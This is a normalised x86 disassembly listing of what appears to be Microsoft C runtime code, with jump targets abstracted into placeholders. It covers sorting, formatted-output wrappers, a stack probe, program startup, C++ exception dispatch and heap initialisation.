add esp 0xc
push esi
push ebx
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jle r-xdata
cmp ebx edi
mov eax edi
je r-xdata
mov edx [ esp + eax * 4 + 0x20 ]
mov eax [ esp + eax * 4 + 0x98 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov ebx edx
mov esi eax
jmp r-xdata
push esi
push edi
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jle r-xdata
cmp ebx esi
mov eax esi
je r-xdata
mov ecx ebx
sub ecx edi
mov esi ebp
mov eax esi
sub eax ebx
xor edx edx
div ebp
inc eax
cmp eax 0x8
ja r-xdata
mov esi [ esp + 0x14 ]
mov edi edi
cmp edi esi
mov eax esi
je r-xdata
mov ecx ebx
sub ecx esi
mov esi ebp
mov bl [ eax ]
mov dl [ ecx + eax ]
mov [ ecx + eax ] bl
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
mov ebx [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
add ebx ebp
cmp ebx eax
ja r-xdata
add ebx ebp
cmp ebx edi
jae r-xdata
mov ecx edi
sub ecx esi
mov esi ebp
mov bl [ eax ]
mov dl [ ecx + eax ]
mov [ ecx + eax ] bl
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
mov ebx [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
sub esi ebp
cmp esi edi
jbe r-xdata
push edi
push ebx
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jle r-xdata
push edi
push ebx
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jle r-xdata
mov bl [ eax ]
mov dl [ ecx + eax ]
mov [ ecx + eax ] bl
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx esi
ja r-xdata
push edi
push esi
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jg r-xdata
lea ebx [ ebx ]
cmp edi ebx
ja r-xdata
add esi ebp
cmp edi esi
jae r-xdata
mov eax esi
je r-xdata
mov edi edi
mov eax [ esp + 0x10 ]
sub esi ebp
cmp esi eax
jbe r-xdata
sub esi ebp
cmp esi edi
jbe r-xdata
cmp edi esi
jne r-xdata
mov ecx [ esp + 0x11c ]
mov ebp ebx
sub ebp esi
mov [ esp + 0x1c ] ecx
lea ecx [ ecx ]
mov edx [ esp + 0x14 ]
mov ecx edx
mov edi esi
sub ecx ebx
sub edi eax
cmp edi ecx
jl r-xdata
push edi
push esi
call [ esp + 0x128 ]
add esp 0x8
test eax eax
je r-xdata
push edi
push esi
call [ esp + 0x128 ]
add esp 0x8
test eax eax
je r-xdata
cmp edi ebx
jbe r-xdata
mov edi ebx
jmp r-xdata
mov cl [ eax + ebp ]
mov dl [ eax ]
mov [ eax + ebp ] dl
mov [ eax ] cl
mov ecx [ esp + 0x1c ]
inc eax
dec ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov ebp [ esp + 0x11c ]
cmp ebx edx
jae r-xdata
cmp eax esi
jae r-xdata
mov eax [ esp + 0x10 ]
cmp edi esi
jb r-xdata
cmp eax esi
jae r-xdata
mov ecx [ esp + 0x18 ]
mov [ esp + ecx * 4 + 0x20 ] ebx
mov [ esp + ecx * 4 + 0x98 ] edx
inc ecx
mov [ esp + 0x18 ] ecx
cmp ebx edx
jae r-xdata
mov ecx [ esp + 0x18 ]
mov [ esp + ecx * 4 + 0x20 ] eax
mov [ esp + ecx * 4 + 0x98 ] esi
inc ecx
mov [ esp + 0x18 ] ecx
lea esp [ esp ]
mov eax [ esp + 0x18 ]
dec eax
mov [ esp + 0x18 ] eax
js r-xdata
mov ebx [ esp + 0x10 ]
mov [ esp + 0x14 ] esi
jmp r-xdata
mov esi [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
jmp r-xdata
sub_42a060
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_42c728
add esp 0xc
test esi esi
mov edi eax
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_42c584
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
sub_42a0c0
cmp eax 0x1000
jae r-xdata
push ecx
lea ecx [ esp + 0x8 ]
neg eax
add eax esp
add eax 0x4
test [ eax ] eax
xchg esp eax
mov eax [ eax ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub_42a0fd
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
call sub_42daa0
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call sub_42cf05
add esp 0x10
leave
retn
sub_42a134
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_42a1a9
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
je r-xdata
cmp ebx 0x61
jl r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
cmp ebx 0x7a
lea eax [ ebx - 0x20 ]
jle r-xdata
cmp ebx 0x100
jae r-xdata
cmp ebx 0x7f
jbe r-xdata
pop ebx
leave
retn
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x3 ] 0x0
xor eax eax
mov [ ebp - 0x4 ] bl
inc eax
and [ ebp - 0x2 ] 0x0
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push 0x1
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
push 0x3
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x200
push [ rw-data ]
call sub_42bcec
add esp 0x20
test eax eax
je r-xdata
test eax eax
je r-xdata
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
jmp r-xdata
movzx eax [ ebp - 0x8 ]
jmp r-xdata
sub_42a2a5
push 0x60
push r--data
call sub_42a4d8
mov edi 0x94
mov eax edi
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
mov ecx [ esi + 0x10 ]
mov [ rw-data ] ecx
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
mov edx [ esi + 0x8 ]
mov [ rw-data ] edx
mov esi [ esi + 0xc ]
and esi 0x7fff
mov [ rw-data ] esi
cmp ecx 0x2
je r-xdata
shl eax 0x8
add eax edx
mov [ rw-data ] eax
xor esi esi
push esi
mov edi [ GetModuleHandleA@IAT ]
call edi
cmp [ eax ] 0x5a4d
jne r-xdata
or esi 0x8000
mov [ rw-data ] esi
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
push esi
call sub_42adc6
pop ecx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
call sub_42e457
mov [ ebp - 0x4 ] esi
call sub_42e2ac
test eax eax
jge r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_42e18a
mov [ rw-data ] eax
call sub_42e0e8
test eax eax
jge r-xdata
push 0x1b
call sub_42a280
pop ecx
push 0x1c
call sub_42db2b
push 0xff
call sub_42bb1d
call sub_42dca2
xor eax eax
cmp [ ecx + 0xe8 ] esi
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
call sub_42deb5
test eax eax
jge r-xdata
push 0x8
call sub_42a280
pop ecx
xor eax eax
cmp [ ecx + 0xf8 ] esi
jmp r-xdata
call sub_42bb4d
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
push 0x9
call sub_42a280
pop ecx
setne al
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] esi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_42de4c
mov [ ebp - 0x68 ] eax
test [ ebp - 0x38 ] 0x1
je r-xdata
push eax
call sub_42a280
pop ecx
push 0xa
pop eax
movzx eax [ ebp - 0x34 ]
jmp r-xdata
call sub_42bc96
jmp r-xdata
push edi
call sub_42bc74
push eax
push [ ebp - 0x68 ]
push esi
push esi
call edi
push eax
call sub_428c20
mov edi eax
mov [ ebp - 0x6c ] edi
cmp [ ebp - 0x1c ] esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
lea esp [ ebp - 0x7c ]
call sub_42a513
retn
sub_42a47e
push 0x8
push r--data
call sub_42a4d8
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
push 0xa
call sub_42db2b
push 0x16
call sub_430443
pop ecx
pop ecx
push 0x3
call sub_42bc85
int3
or [ ebp - 0x4 ] 0xffffffff
sub_42a4d8
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_42a524
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
retn
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ edi + 0x4 ]
cmp eax ecx
je r-xdata
test [ edi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_42e640
test eax eax
pop ecx
pop ecx
jne r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
test [ esi ] 0x2
jne r-xdata
sub_42a58c
push 0x10
push r--data
call sub_42a4d8
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
inc [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_42a639
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebx + 0x8 ] esi
call sub_42a513
retn
call sub_42a4ab
call sub_42a4ab
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_42ad60
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_42a649
push 0x8
push r--data
call sub_42a4d8
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_42a513
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_429522
or [ ebp - 0x4 ] 0xffffffff
sub_42a68e
mov edx [ ecx + 0x4 ]
push esi
mov esi eax
mov eax [ ecx ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_42a6ab
push 0x40
push r--data
call sub_42a4d8
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x20 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_4296c0
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x38 ] eax
mov [ rw-data ] esi
mov eax [ ebp + 0x10 ]
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_42972d
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42a7e3
mov eax [ ebp - 0x1c ]
call sub_42a513
retn
sub_42a725
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x1c ] 0x0
mov [ ebp - 0x40 ] 0x1
je r-xdata
mov eax [ ebp - 0x40 ]
retn
sub_42a768
mov esp [ ebp - 0x18 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x44 ] eax
mov edi [ ebp + 0xc ]
mov eax [ edi + 0x8 ]
mov [ ebp - 0x48 ] eax
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x4c ] edx
xor edx edx
push eax
push ecx
xor esi esi
push esi
push edi
call sub_42a58c
add esp 0x10
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
mov esi [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_42a7e3
mov eax [ ebp - 0x1c ]
call sub_42a513
retn
lea esi [ edx + edx * 4 ]
mov ebx [ ebp - 0x4c ]
lea esi [ ebx + esi * 4 ]
mov ebx [ esi + 0x4 ]
cmp eax ebx
jle r-xdata
inc edx
jmp r-xdata
cmp eax [ esi + 0x8 ]
jg r-xdata
mov [ ebp - 0x50 ] edx
cmp edx [ ecx + 0xc ]
jae r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x44 ]
mov eax [ edx + eax * 8 ]
mov [ ebp - 0x48 ] eax
sub_42a7e3
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_4296f4
pop ecx
mov eax [ ebp - 0x34 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x38 ]
mov [ rw-data ] eax
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ esi + 0x18 ]
call sub_4296d9
pop ecx
test eax eax
je r-xdata
call sub_4298d6
push eax
push esi
call sub_42a649
pop ecx
pop ecx
sub_42a841
push 0x8
push r--data
call sub_42a4d8
mov esi ecx
mov eax [ ebp + 0xc ]
mov edi edx
mov ebx [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
call sub_42a513
retn
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ eax ]
test eax eax
js r-xdata
test [ eax + 0x3 ] 0x80
je r-xdata
and [ ebp - 0x4 ] 0x0
push 0x1
push [ ebx + 0x18 ]
test al 0x8
je r-xdata
lea edi [ ecx + edi + 0xc ]
test [ esi ] 0x1
je r-xdata
call sub_42e6c8
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
jne r-xdata
call sub_42e6c8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42a4ab
push 0x1
push edi
call sub_42e6e4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42e6c8
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42e6c8
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_42e6e4
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ edi ] eax
push 0x1
push edi
call sub_42e6e4
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_42e6e4
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_429090
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_42e700
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea ecx [ esi + 0x8 ]
mov eax [ ebx + 0x18 ]
call sub_42a68e
push eax
push edi
call sub_429090
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
lea ecx [ esi + 0x8 ]
test [ esi ] 0x4
je r-xdata
jmp r-xdata
call sub_42a68e
push eax
push [ esi + 0x18 ]
push edi
call sub_429522
jmp r-xdata
push 0x1
call sub_42a68e
push eax
push [ esi + 0x18 ]
push edi
call sub_429522
jmp r-xdata
lea ecx [ esi + 0x8 ]
call sub_42a68e
mov [ edi ] eax
jmp r-xdata
sub_42a9bd
push ebp
mov ebp esp
test ecx ecx
je r-xdata
cmp [ ebp + 0x1c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push ebx
push [ ebp + 0x8 ]
mov edx esi
call sub_42a841
pop ecx
pop ecx
push [ ebp + 0x1c ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4294f2
call sub_429529
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_42a58c
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x18 ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_42a6ab
add esp 0x28
test eax eax
je r-xdata
sub_42aa24
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x80000003
je r-xdata
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0x1c ]
push edi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_429646
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42977e
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
push ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0xc ]
push 0x1
push [ ebp + 0x24 ]
lea ebx [ eax - 0x10 ]
push [ ebp + 0x20 ]
xor ecx ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_42a9bd
mov esi [ ebp + 0x1c ]
add esp 0x1c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_42aae6
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
cmp eax 0xffffffff
mov [ ebp - 0x18 ] eax
jl r-xdata
call sub_42a4ab
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0xe06d7363
push esi
push edi
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x3
mov edi 0x19930520
jne r-xdata
jmp sub_42a47e
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x18 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_42aa24
add esp 0x20
jmp r-xdata
cmp [ ebx ] 0xe06d7363
jne r-xdata
cmp [ ebx + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_429646
mov ecx [ ebp - 0x8 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
jae r-xdata
mov esi eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x1c ] 0x1
call sub_42e6c8
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
jmp r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_42a4ab
push 0x1
push ebx
call sub_42a649
pop ecx
pop ecx
cmp [ eax ] esi
jg r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
add eax 0x14
cmp ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp esi [ eax + 0x4 ]
jg r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ eax + 0x14 ] edi
jne r-xdata
mov esi [ ebp - 0x18 ]
mov ecx [ eax + 0xc ]
test ecx ecx
mov esi [ eax + 0x10 ]
mov [ ebp - 0x14 ] ecx
jle r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0x1c ]
mov ecx [ ecx + 0xc ]
lea edx [ ecx + 0x4 ]
mov ecx [ ecx ]
test ecx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
jle r-xdata
call sub_42a4ab
dec [ ebp - 0x14 ]
add esi 0x10
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
mov eax [ ebp - 0xc ]
mov edi [ eax ]
push [ ebx + 0x1c ]
mov [ ebp - 0x24 ] edi
call sub_42a524
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
push [ ebp - 0x1c ]
mov edi [ ebp - 0x4 ]
push [ ebp + 0x24 ]
mov ecx [ ebp - 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ebx
mov ebx esi
mov esi [ ebp + 0xc ]
call sub_42a9bd
mov ebx [ ebp + 0x8 ]
add esp 0x1c
mov eax edi
dec [ ebp - 0x10 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x10 ] eax
jg r-xdata
mov eax [ ebp - 0x4 ]
sub_42acbd
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
mov eax [ esi ]
push edi
and eax 0x1fffffff
mov edi 0x19930520
cmp eax edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_42a4ab
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
inc eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_42aae6
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_42a58c
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_42ad60
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4298f9
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4298f9
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_42adc6
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_42adac
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
inc eax
retn
push 0x3f8
call sub_42ae17
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_42ae17
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_42ae5f
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_42ae8a
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
